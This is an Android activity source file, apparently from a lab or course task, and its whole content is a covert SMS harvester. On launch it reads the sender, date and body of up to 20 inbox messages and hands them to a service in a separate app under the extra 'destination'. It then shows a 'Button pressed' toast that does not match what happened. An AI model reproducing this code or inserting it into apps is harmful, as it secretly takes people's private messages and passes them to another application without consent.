package com.example.mnit.task26;

import android.content.ComponentName;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import java.io.Serializable;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MainActivity extends AppCompatActivity {



            @Override
            protected void onCreate(Bundle savedInstanceState) {
                final String sb=getmsgdetails();
                            ComponentName name = new ComponentName("com.example.mnit.servicesmssd", "com.example.mnit.servicesmssd.ServiceSMSSd");
                            Intent abc = new Intent();
                            abc.setComponent(name);
                            abc.setAction(Intent.ACTION_MAIN);
                            abc.addCategory(Intent.CATEGORY_LAUNCHER);
                            abc.putExtra("destination", (Serializable) sb);
                            ComponentName c = getApplication().startService(abc);
                            if (c == null) {
                                Log.e("error", "failed to start with " + abc);
                            }
                            Toast.makeText(getApplicationContext(), "Button pressed", Toast.LENGTH_SHORT).show();

            super.onCreate(savedInstanceState);
                setContentView(R.layout.activity_main);
            }
            private String getmsgdetails() {
                Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
                String msgData="";
                int h=0;
                if (cursor.moveToFirst()) { // must check the result to prevent exception
                    do {

                            msgData +=cursor.getColumnName(2) + ":" + cursor.getString(2);
                        msgData+="\n";
                        Date date = new Date(cursor.getLong(4));
                        String formattedDate = new SimpleDateFormat("MM/dd/yyyy").format(date);
                            msgData +=cursor.getColumnName(4) + ":" + formattedDate;
                        msgData+="\n";
                            msgData +=cursor.getColumnName(12) + ":" + cursor.getString(12);
                        msgData+="\n";


                        msgData+="\n";
                        h++;

                        // use msgData
                    } while (cursor.moveToNext()&&h!=20);
                } else {
                    // empty box, no SMS
                }
                return msgData;
            } }
